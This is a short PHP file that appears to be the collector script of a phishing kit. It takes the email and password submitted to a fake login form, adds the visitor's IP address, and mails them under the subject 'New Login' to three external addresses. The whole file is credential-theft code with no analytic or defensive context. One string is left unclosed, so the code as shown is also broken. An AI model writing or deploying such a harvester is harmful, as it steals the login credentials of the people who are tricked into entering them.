<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to = "tmalone27@mail.ru, jamescordy8844@gmail.com, agry917@outlook.com
		
		
         $subject = "New Login : ip";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
         $message .= "Ip           : ".$ip."\r\n";
		 
		$header = "Content type: xeuztech \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>